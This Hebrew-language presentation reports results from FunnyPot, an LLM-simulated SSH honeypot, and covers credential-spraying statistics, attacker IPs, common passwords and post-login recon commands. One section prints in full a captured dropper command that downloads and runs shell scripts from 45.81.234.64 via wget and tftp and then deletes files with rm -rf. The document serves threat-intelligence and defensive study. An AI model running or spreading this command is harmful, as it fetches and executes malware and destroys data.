# FunnyPot - מצגת מוצר ותוצאות

נתונים עד: **24/05/2026 13:45 UTC**

## 1. תקציר מנהלים

**FunnyPot** הוא Honeypot מבוסס SSH שמדמה שרת Linux רגיש באמצעות LLM, קולט תוקפים אמיתיים, מתעד ניסיונות התחברות ופקודות, ומתרגם פעילות גולמית לתובנות Threat Intelligence.

המערכת אינה רק מלכודת סיסמאות. היא מאפשרת לראות מה תוקפים עושים אחרי שהם חושבים שהצליחו להיכנס: Fingerprinting, חיפוש משאבים, הורדת Payloads, בדיקת Miner, וניסיונות הרצה.

### מדדים מרכזיים

| מדד | ערך |
| --- | ---: |
| אירועים שנאספו | 2,298 |
| ניסיונות הזדהות | 437 |
| כתובות IP ייחודיות | 29 |
| Shell sessions שנפתחו | 48 |
| פקודות תוקף | 48 |
| תוצאות פקודה | 46 |
| Payload acquisition events | 5 |

## 2. מה המוצר עושה?

FunnyPot מדמה סביבת SSH שנראית לתוקף כמו שרת Linux ישן, רגיש ומעניין.

יכולות מרכזיות:

- **SSH honeypot**: קולט ניסיונות Auth ומאפשר Shell מדומה לאחר Threshold.
- **LLM shell simulation**: פקודות מורכבות נענות על ידי LLM כדי לייצר אינטראקציה עשירה ולא סטטית.
- **Static + builtin fast path**: פקודות פשוטות כמו `uname`, `uptime`, `pwd` נענות מהר ובאופן דטרמיניסטי.
- **Telemetry pipeline**: כל אירוע נכתב כ־JSONL/YAML ומוזן לדשבורד.
- **Threat analytics**: חילוץ Payload URLs, יעדי Egress, MITRE ATT&CK, AVP, latency ויחס שגיאות.
- **GitHub Pages dashboard**: פרסום תוצאות לדשבורד סטטי לצפייה מהירה.

## 3. ארכיטקטורת זרימה

1. **חיבור SSH**
   סריקה או ניסיון התחברות מגיעים לשרת.

2. **Credential harvesting**
   המערכת מתעדת שם משתמש, סיסמה, מקור ו־metadata.

3. **Shell מדומה**
   לאחר Threshold התוקף מקבל סביבת Bash מדומה.

4. **ניתוח פקודות**
   כל פקודה מנותחת לפי מורכבות, Payloads, Persistence, Tunneling ו־MITRE.

5. **פרסום תוצאות**
   האירועים מסוכמים ל־`harvest_summary.json` ומוצגים בדשבורד.

## 4. תמונת מצב כמותית

| קטגוריה | ערך | פרשנות |
| --- | ---: | --- |
| TCP/SSH sessions | 616 | הרבה סריקות או ניסיונות חיבור קצרי חיים |
| Auth attempts | 437 | פעילות Credential spraying משמעותית |
| Harvested credentials | 437 | כל ניסיון נשמר לצורך ניתוח מילונים וקמפיינים |
| Shell opens | 48 | חלק קטן עובר להתנהגות post-auth |
| Commands | 48 | התנהגות לאחר כניסה בפועל |
| Failed results | 10 מתוך 46 | כ־21.7%, מעיד על סקריפטים עיוורים ופקודות לא מותאמות |
| Payload URLs | 5 | ניסיונות הורדת כלי תקיפה |
| Unique payload URLs | 1 | קמפיין ממוקד סביב תשתית יחידה |

### פרשנות

רוב הפעילות היא **Credential spraying** ולא תפעול ידני. היחס בין 437 ניסיונות Auth ל־48 Shells מראה משפך תקיפה ברור: רוב התוקפים רק בודקים סיסמאות, וחלק קטן ממשיך לפעולות מערכת.

מתוך 48 פקודות, 5 הן ניסיונות Payload או Binary tooling. זהו שיעור משמעותי: כ־10% מה־Shells הגיעו לכוונת הרצה ממשית.

## 5. מדדי איכות אינטראקציה

| מדד | ערך |
| --- | ---: |
| זמן תגובה ממוצע | 2,531ms |
| זמן תגובה חציוני | 0ms |
| AVP ממוצע | 1.9 |
| AVP מקסימלי | 18 |
| מורכבות פקודה ממוצעת | 12.2 |
| מורכבות פקודה מקסימלית | 73 |

### פרשנות

- זמן תגובה ממוצע של כ־2.5 שניות מתאים למסלול LLM.
- חציון 0ms מצביע על כך שחלק גדול מהפקודות עדיין מקבלות מענה מהיר דרך static/builtin path.
- AVP נמוך ברוב הסשנים מעיד על Recon בסיסי, אבל AVP מקסימלי 18 מצביע על פקודות בעלות כוונת Payload/Execution.
- מורכבות מקסימלית 73 מגיעה משרשרת Dropper ארוכה עם `wget`, `tftp`, `chmod`, `sh` ו־cleanup.

## 6. מקורות תקיפה מובילים

| IP | ניסיונות |
| --- | ---: |
| 87.251.64.176 | 195 |
| 171.243.149.254 | 43 |
| 27.79.44.223 | 41 |
| 27.79.7.158 | 40 |
| 27.79.2.203 | 39 |
| 80.94.92.171 | 12 |
| 176.65.139.213 | 9 |
| 213.209.159.158 | 8 |

### פרשנות

כתובת אחת, `87.251.64.176`, אחראית לכ־45% מכל ניסיונות ההזדהות. זה נראה כמו קמפיין אוטומטי או Scanner יחיד עם מילון קצר.

קבוצה נוספת של כתובות תחת `27.79.x.x` מצביעה על מקור אזורי/ספק דומה או שימוש ברשת פרוקסי.

מסקנה מוצרית: כדאי להוסיף Cluster view לפי ASN, Prefix ו־Geo כדי לזהות Campaigns ולא רק IP בודד.

## 7. Credentials: מה התוקפים מנסים?

### שמות משתמש נפוצים

| Username | ניסיונות |
| --- | ---: |
| support | 199 |
| root | 80 |
| admin | 45 |
| sol | 9 |
| ubuntu | 6 |
| test | 6 |
| user | 4 |

### סיסמאות נפוצות

| Password | ניסיונות |
| --- | ---: |
| 123456789 | 195 |
| admin | 20 |
| 1234 | 9 |
| root | 8 |
| 12345 | 7 |
| 123 | 6 |
| password | 6 |
| 123456 | 6 |
| h3c.com! | 6 |
| admin123 | 5 |

### פרשנות

הזוגות הדומיננטיים הם Default/weak credentials. השילוב `support` עם `123456789` בכמות חריגה מרמז על קמפיין ממוקד לציוד IoT, נתבים, מצלמות או Network appliances.

זה לא נראה כמו תוקף ידני שמנסה וריאציות חכמות, אלא כמו Spray אוטומטי עם רשימה מוכנה.

## 8. פקודות נפוצות

| פקודה | כמות | משמעות |
| --- | ---: | --- |
| `/bin/./uname -s -v -n -r -m` | 8 | Fingerprinting עם obfuscation קל |
| `uptime -p` | 8 | הערכת יציבות/אטרקטיביות יעד |
| `cd /tmp ... wget ... tftp ... sh ...` | 5 | Dropper/Payload chain |
| `uname -s -m` | 4 | בדיקת OS/Architecture |
| `lspci \| grep VGA \| cut ...` | 3 | חיפוש GPU, כנראה התאמת Miner |
| `/ip cloud print` | 2 | פקודת MikroTik/RouterOS; ניסיון לזהות Router |
| `ifconfig` | 2 | Network discovery |
| `cat /proc/cpuinfo` | 2 | CPU fingerprinting |
| `ps \| grep '[Mm]iner'` | 2 | בדיקת Miner קיים |
| `ps -ef \| grep '[Mm]iner'` | 2 | בדיקת Miner קיים |
| Telegram/SMS paths search | 2 | חיפוש נתוני משתמש/תקשורת |
| `echo Hi \| cat -n` | 2 | בדיקת Shell ופייפים |

## 9. פרשנות לפקודות הנפוצות

### `uname`, `uptime`, `cpuinfo`

אלו פקודות Fingerprinting. התוקף רוצה לדעת אם המערכת מתאימה לניצול: Kernel, Architecture, CPU ו־Uptime.

Uptime גבוה עשוי לרמז על שרת יציב, מוזנח, או כזה שאולי לא עודכן זמן רב.

### `lspci | grep VGA`

פקודה זו מעניינת במיוחד כי היא מחפשת GPU. זה מתאים להתנהגות של Miner או כלי שמנסה להעריך יכולות Compute.

### `ps | grep '[Mm]iner'`

התוקף בודק אם כבר רץ Miner. זה יכול להעיד על אחד משני דברים:

- ניסיון להימנע מהרצת Miner כפול.
- ניסיון לזהות תחרות/תשתית שכבר נפרצה.

### Telegram/SMS paths

חיפוש תיקיות TelegramDesktop, התקני GSM, SMS spool וקבצי `smsd` מצביע על ניסיון opportunistic לגנוב נתוני תקשורת או לזהות מכשיר שמנהל מודמים/SMS.

## 10. פקודת Payload מרכזית

```bash
cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh; tftp 45.81.234.64 -c get 10Gtftp1.sh; chmod 777 10Gtftp1.sh; sh 10Gtftp1.sh; tftp -r 10Gtftp2.sh -g 45.81.234.64; chmod 777 10Gtftp2.sh; sh 10Gtftp2.sh; rm -rf 10Gbins.sh 10Gtftp1.sh 10Gtftp2.sh; rm -rf *
```

### מה הפקודה עושה?

1. מנסה לעבור לתיקיות כתיבה: `/tmp`, `/run`, `/`.
2. מנסה להוריד Payload דרך `wget`.
3. נותנת הרשאות הרצה עם `chmod 777`.
4. מריצה את הקובץ עם `sh`.
5. מנסה שוב דרך `tftp` בשתי צורות שונות.
6. מנקה קבצים וראיות עם `rm -rf`.

### פרשנות

זו שרשרת Dropper מלאה, לא Recon. היא מנסה כמה נתיבי הורדה כדי להתמודד עם סביבות שונות שבהן חלק מהכלים חסרים.

החזרתיות של אותה שרשרת 5 פעמים מצביעה על בוט אוטומטי או קמפיין יחיד.

## 11. MITRE ATT&CK, Payloads ו־Egress

| מדד | ערך |
| --- | --- |
| MITRE Technique | T1105 - Ingress Tool Transfer |
| Payload URL | `http://45.81.234.64/10Gbins.sh` |
| Payload repetitions | 5 |
| Unique payload URLs | 1 |
| Egress target | HTTP |

### פרשנות

הטכניקה המרכזית שנראתה היא **T1105 - Ingress Tool Transfer**. כלומר, לאחר כניסה, התוקף מנסה להביא כלי חיצוני לתוך המערכת.

לא נצפו כרגע:

- Persistence מובהק.
- SSH tunneling.
- Proxy tooling כמו `chisel`, `frp`, `socat`.

המשמעות: הקמפיין שנצפה מתמקד בעיקר ב־initial execution ולא בשלבי אחיזה ארוכי טווח.

## 12. איכות הסימולציה וה־LLM

### מה עובד טוב

- פקודות פשוטות מקבלות תגובות מהירות ואמינות.
- פקודות מורכבות עוברות ל־LLM במקום להיחתך על ידי builtin/static path.
- המערכת מאפשרת ל־LLM לייצר פלט חשוד סביר, למשל Miner process, כי זה מועיל ללמידת TTP.
- יש בדיקות שמונעות short-circuit שגוי לפקודות עם `;`, `&&`, `||` ו־pipes.

### נקודות לשיפור

- יש להמשיך לבדוק פקודות edge כמו `cat /bin/echo`, redirection ו־binary output.
- כדאי להעשיר את ה־LLM prompt בדוגמאות נוספות של Bash behavior.
- חשוב למדוד בנפרד static responses מול LLM responses כדי להבין איכות סימולציה מול ביצועים.

## 13. מסקנות מוצריות

FunnyPot כבר מתפקד כ־Threat Intelligence Capture Platform ולא רק Honeypot בסיסי.

הוא מספק:

- מודיעין על Credential spraying.
- זיהוי מקורות וקמפיינים.
- תיעוד פקודות Post-auth.
- זיהוי Payload URLs ו־TTP.
- בסיס טוב ל־IOC enrichment.

### השלב הבא המומלץ

1. **ASN/Geo enrichment**
   הצגת Campaign clusters לפי ASN, Prefix ומדינה.

2. **Payload enrichment**
   הורדה בטוחה, Hash, MIME, גודל, ושמירת Metadata.

3. **Bot vs Human scoring**
   שילוב latency, command complexity, retry behavior ו־error ratio.

4. **SOC exports**
   יצוא STIX/TAXII, Sigma או YARA מתוך ה־IOCs שנאספו.

5. **LLM quality dashboard**
   מדידת hallucination, realism, short-circuit rate ו־response correctness.

## 14. שורה תחתונה

הנתונים מראים תמהיל ברור:

- הרבה סריקות סיסמאות אוטומטיות.
- מעט Sessions שמגיעים ל־Shell.
- מספר משמעותי של ניסיונות Payload.
- Fingerprinting עקבי של Kernel, Uptime, CPU/GPU.
- IOC ברור סביב `45.81.234.64` ו־`10Gbins.sh`.

הערך המרכזי של FunnyPot הוא היכולת להפוך אינטראקציה עם תוקף לנתונים מובנים: מי ניסה להיכנס, עם אילו סיסמאות, מה הוא בדק אחרי הכניסה, איזה Payload הוא ניסה להביא, ואיך זה ממופה ל־TTP.

## 15. מקורות נתונים

המצגת מבוססת על Snapshot מתוך הקונטיינר:

- `/home/test/app/frontend/data/harvest_summary.json`
- `/home/test/app/frontend/data/harvest.jsonl`
- אירועי `command`, `command_result`, `auth_attempt`, `shell_session_start`, `payload_capture`

הנתונים נותחו מקומית מתוך סביבת הפרויקט.
